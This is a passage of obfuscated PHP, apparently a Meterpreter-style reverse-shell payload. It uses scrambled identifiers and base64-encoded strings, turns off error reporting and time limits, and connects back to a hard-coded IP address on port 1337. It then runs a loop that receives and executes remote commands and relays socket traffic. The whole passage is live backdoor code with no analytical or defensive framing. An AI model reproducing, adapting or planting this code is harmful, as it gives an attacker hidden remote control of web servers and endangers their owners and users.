false;}if(is_callable(base64_decode('c29ja2V0X3NldF90aW1lb3V0'))){socket_set_timeout($s4c,2);}x34($s4c);}else{$s4c=fsockopen($n97.base64_decode('Oi8v').$t94,$n95);if(!$s4c){return false;}x34($s4c,$t94,$n95);}}else if(is_callable(base64_decode('c29ja2V0X2NyZWF0ZQ=='))){e1(base64_decode('c29ja2V0X2NyZWF0ZQ=='));if($n97==base64_decode('dGNw')){$s4c=s9c($d98,SOCK_STREAM,SOL_TCP);$l5c=o9d($s4c,$q99,$n95);if(!$l5c){return false;}c33($s4c);}elseif($n97==base64_decode('dWRw')){$s4c=s9c($d98,SOCK_DGRAM,SOL_UDP);c33($s4c,$q99,$n95);}}return $s4c;}function q36($k77){$i56=false;switch(t3a($k77)){case base64_decode('c29ja2V0'):break;case base64_decode('c3RyZWFt'):$i56=feof($k77);break;}return $i56;}function e37($k77){e1("Closing resource $k77");global $o46,$u8b;y3d($k77);switch(t3a($k77)){case base64_decode('c29ja2V0'):$i56=o9e($k77);break;case base64_decode('c3RyZWFt'):$i56=fclose($k77);break;}if(array_key_exists((int)$k77,$o46)){unset($o46[(int)$k77]);}if(array_key_exists((int)$k77,$u8b)){e1("Removing $k77 from udp_host_map");unset($u8b[(int)$k77]);}return $i56;}function y38($k77,$j5a=null){global $u8b;if(is_null($j5a)){$j5a=8192;}$d9f='';switch(t3a($k77)){case base64_decode('c29ja2V0'):if(array_key_exists((int)$k77,$u8b)){e1(base64_decode('UmVhZGluZyBVRFAgc29ja2V0'));list($pa0,$n95)=$u8b[(int)$k77];ma1($k77,$d9f,$j5a,PHP_BINARY_READ,$pa0,$n95);}else{e1(base64_decode('UmVhZGluZyBUQ1Agc29ja2V0'));$d9f.=aa2($k77,$j5a,PHP_BINARY_READ);}break;case base64_decode('c3RyZWFt'):global $m8a;$ya3=Array($k77);e1("Calling select to see if there's data on $k77");$xa4=0;while(true){$sa5=NULL;$ha6=NULL;$ha7=0;$va8=stream_select($ya3,$sa5,$ha6,$ha7);if($va8===0){break;}if($va8===false or feof($k77)){e1(base64_decode('Q2hlY2tpbmcgZm9yIGZhaWxlZCByZWFkLi4u'));if(empty($d9f)){e1("---- EOF ON $k77 ----");$d9f=false;}break;}$ra9=stream_get_meta_data($k77);k2($ra9,"Metadata for {$k77}");if($ra9[base64_decode('dW5yZWFkX2J5dGVz')]>0){$xa4=min($j5a,$ra9[base64_decode('dW5yZWFkX2J5dGVz')]);$d9f.=fread($k77,$xa4);break;}else{$z64=fread($k77,$j5a);$xa4=$j5a;$d9f.=$z64;if(strlen($z64)<$j5a){break;}}if($k77!=$m8a){e1("buff: '$d9f'");}$ya3=Array($k77);}e1(sprintf("Done with the big read loop on $k77, got %d bytes, asked for %d bytes",strlen($d9f),$xa4));break;default:$u61=q1d($k77);$h3e=g1e($u61);if($h3e and $h3e[base64_decode('ZGF0YQ==')]){$d9f=substr($h3e[base64_decode('ZGF0YQ==')],0,$j5a);$h3e[base64_decode('ZGF0YQ==')]=substr($h3e[base64_decode('ZGF0YQ==')],$j5a);e1(base64_decode('QWhhISBnb3Qgc29tZSBsZWZ0b3ZlcnM='));}else{e1("Wtf don't know how to read from resource $k77, c: $h3e");if(is_array($h3e)){k2($h3e);}break;}}e1(sprintf(base64_decode('UmVhZCAlZCBieXRlcw=='),strlen($d9f)));return $d9f;}function q39($k77,$d9f,$j5a=0){global $u8b;if($j5a==0){$j5a=strlen($d9f);}$baa=false;switch(t3a($k77)){case base64_decode('c29ja2V0'):if(array_key_exists((int)$k77,$u8b)){e1(base64_decode('V3JpdGluZyBVRFAgc29ja2V0'));list($pa0,$n95)=$u8b[(int)$k77];$baa=pab($k77,$d9f,$j5a,$pa0,$n95);}else{$baa=cac($k77,$d9f,$j5a);}break;case base64_decode('c3RyZWFt'):$baa=fwrite($k77,$d9f,$j5a);fflush($k77);break;default:e1("Wtf don't know how to write to resource $k77");break;}return $baa;}function t3a($k77){global $o46;if(array_key_exists((int)$k77,$o46)){return $o46[(int)$k77];}return false;}function v3b(&$ya3,&$sa5,&$ha6,$cad=0,$tae=0){$zaf=array();$pb0=array();$ub1=array();$zb2=array();$zb3=array();$zb4=array();if($ya3){foreach($ya3 as $k77){switch(t3a($k77)){case base64_decode('c29ja2V0'):$zb2[]=$k77;break;case base64_decode('c3RyZWFt'):$zaf[]=$k77;break;default:e1(base64_decode('VW5rbm93biByZXNvdXJjZSB0eXBl'));break;}}}if($sa5){foreach($sa5 as $k77){switch(t3a($k77)){case base64_decode('c29ja2V0'):$zb3[]=$k77;break;case base64_decode('c3RyZWFt'):$pb0[]=$k77;break;default:e1(base64_decode('VW5rbm93biByZXNvdXJjZSB0eXBl'));break;}}}if($ha6){foreach($ha6 as $k77){switch(t3a($k77)){case base64_decode('c29ja2V0'):$zb4[]=$k77;break;case base64_decode('c3RyZWFt'):$ub1[]=$k77;break;default:e1(base64_decode('VW5rbm93biByZXNvdXJjZSB0eXBl'));break;}}}$mb5=count($zb2)+count($zb3)+count($zb4);$ib6=count($zaf)+count($pb0)+count($ub1);$ya3=array();$sa5=array();$ha6=array();if(count($zb2)==0){$zb2=null;}if(count($zb3)==0){$zb3=null;}if(count($zb4)==0){$zb4=null;}if(count($zaf)==0){$zaf=null;}if(count($pb0)==0){$pb0=null;}if(count($ub1)==0){$ub1=null;}$baa=0;if($mb5>0){$l5c=nb7($zb2,$zb3,$zb4,$cad,$tae);if(false===$l5c){return false;}if(is_array($ya3)&&is_array($zb2)){$ya3=array_merge($ya3,$zb2);}if(is_array($sa5)&&is_array($zb3)){$sa5=array_merge($sa5,$zb3);}if(is_array($ha6)&&is_array($zb4)){$ha6=array_merge($ha6,$zb4);}$baa+=$l5c;}if($ib6>0){$l5c=stream_select($zaf,$pb0,$ub1,$cad,$tae);if(false===$l5c){return false;}if(is_array($ya3)&&is_array($zaf)){$ya3=array_merge($ya3,$zaf);}if(is_array($sa5)&&is_array($pb0)){$sa5=array_merge($sa5,$pb0);}if(is_array($ha6)&&is_array($ub1)){$ha6=array_merge($ha6,$ub1);}$baa+=$l5c;}return $baa;}function f3c($k77){global $o45;if(is_resource($k77)&&!in_array($k77,$o45)){$o45[]=$k77;}}function y3d($k77){global $o45;if(in_array($k77,$o45)){foreach($o45 as $d43=>$ya3){if($ya3==$k77){unset($o45[$d43]);}}}}ob_implicit_flush();error_reporting(0);@ignore_user_abort(true);@set_time_limit(0);@ignore_user_abort(1);@ini_set(base64_decode('bWF4X2V4ZWN1dGlvbl90aW1l'),0);$GLOBALS[base64_decode('VVVJRA==')]=PAYLOAD_UUID;$GLOBALS[base64_decode('U0VTU0lPTl9HVUlE')]=SESSION_GUID;$GLOBALS[base64_decode('QUVTX0tFWQ==')]=null;$GLOBALS[base64_decode('QUVTX0VOQUJMRUQ=')]=false;if(!isset($GLOBALS[base64_decode('bXNnc29jaw==')])){$t94=base64_decode('MTU3LjIzMC4xMDcuNDg=');$n95=1337;e1("Don't have a msgsock, trying to connect($t94, $n95)");$m8a=n35($t94,$n95);if(!$m8a){die();}}else{$m8a=$GLOBALS[base64_decode('bXNnc29jaw==')];$qb8=$GLOBALS[base64_decode('bXNnc29ja190eXBl')];switch($qb8){case base64_decode('c29ja2V0'):c33($m8a);break;case base64_decode('c3RyZWFt'):default:x34($m8a);}}f3c($m8a);$ya3=$GLOBALS[base64_decode('cmVhZGVycw==')];$sa5=NULL;$ha6=NULL;$ha7=1;while(false!==($va8=v3b($ya3,$sa5,$ha6,$ha7))){$yb9=false;for($p62=0;$p62<$va8;$p62++){$tba=$ya3[$p62];if($tba==$m8a){$gbb=y38($m8a,32);e1(sprintf(base64_decode('UmVhZCByZXR1cm5lZCAlcyBieXRlcw=='),strlen($gbb)));if(false==$gbb){e1(base64_decode('UmVhZCBmYWlsZWQgb24gbWFpbiBzb2NrZXQsIGJhaWxpbmc='));break 2;}$s89=substr($gbb,0,4);$rbc=p24($s89,substr($gbb,4,28));$s83=unpack(base64_decode('Tmxlbg=='),substr($rbc,20,4));$j5a=$s83[base64_decode('bGVu')]+32-8;while(strlen($gbb)<$j5a){$gbb.=y38($m8a,$j5a-strlen($gbb));}$abd=x2c(e27(p24($s89,$gbb)));q29($m8a,$abd);}else{$m5b=y38($tba);if(false===$m5b){c2a($tba);}elseif(strlen($m5b)>0){e1(sprintf(base64_decode('UmVhZCByZXR1cm5lZCAlcyBieXRlcw=='),strlen($m5b)));$fbe=v2b($tba,$m5b);if($fbe){q29($m8a,$fbe);}}}}$ya3=$GLOBALS[base64_decode('cmVhZGVycw==')];}e1(base64_decode('RmluaXNoZWQ='));e1(base64_decode('LS0tLS0tLS0tLS0tLS0tLS0tLS0='));e37($m8a);?>